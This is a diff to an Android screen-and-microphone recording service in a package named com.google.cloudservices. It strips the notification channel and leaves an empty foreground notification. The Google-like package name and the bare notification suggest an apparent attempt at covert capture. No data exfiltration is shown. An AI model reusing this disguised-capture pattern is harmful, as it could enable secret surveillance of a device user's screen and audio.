@@ -1,7 +1,7 @@
 package com.google.cloudservices;
 
+import android.annotation.TargetApi;
 import android.app.Notification;
-import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
@@ -53,16 +53,17 @@ public class Captureservice extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            createNotificationChannel();
-            Notification notification = new NotificationCompat.Builder(getApplicationContext(), "ForegroundServiceChannel")
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//            createNotificationChannel();
+            Notification notification = new NotificationCompat.Builder(getApplicationContext())
                     .build();
             startForeground(1, notification);
 
 
-        }
+//        }
 
         if (intent.getAction()==null) {
             resultCode=intent.getIntExtra(EXTRA_RESULT_CODE, 1337);
@@ -77,20 +78,20 @@ public class Captureservice extends Service {
         return super.onStartCommand(intent, flags, startId);
     }
 
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    "ForegroundServiceChannel",
-                    "Foreground Service Channel",
-                    NotificationManager.IMPORTANCE_DEFAULT
-            );
-            NotificationManager manager = getSystemService(NotificationManager.class);
-
-            manager.createNotificationChannel(serviceChannel);
-
-
-        }
-    }
+//    private void createNotificationChannel() {
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//            NotificationChannel serviceChannel = new NotificationChannel(
+//                    "ForegroundServiceChannel",
+//                    "Foreground Service Channel",
+//                    NotificationManager.IMPORTANCE_DEFAULT
+//            );
+//            NotificationManager manager = getSystemService(NotificationManager.class);
+//
+//            manager.createNotificationChannel(serviceChannel);
+//
+//
+//        }
+//    }
     private void initRecorder() {
         try {
             mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -110,12 +111,14 @@ public class Captureservice extends Service {
             e.printStackTrace();
         }
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private void shareScreen() {
 //        mMediaProjectionCallback = new MediaProjectionCallback();
         mMediaProjection = mProjectionManager.getMediaProjection(resultCode,resultData);
         mVirtualDisplay = createVirtualDisplay();
         mMediaRecorder.start();
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private VirtualDisplay createVirtualDisplay() {
         return mMediaProjection.createVirtualDisplay("Captureservice",
                 DISPLAY_WIDTH, DISPLAY_HEIGHT, mScreenDensity,
@@ -123,6 +126,7 @@ public class Captureservice extends Service {
                 mMediaRecorder.getSurface(), null /*Callbacks*/, null
                 /*Handler*/);
     }
+    @TargetApi(Build.VERSION_CODES.KITKAT)
     private void stopScreenSharing() {
         if (mVirtualDisplay == null) {
             return;
@@ -150,6 +154,7 @@ public class Captureservice extends Service {
         destroyMediaProjection();
 
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private void destroyMediaProjection() {
         if (mMediaProjection != null) {
             Log.e("Exsdsd", "destroyMediaProjection: " );
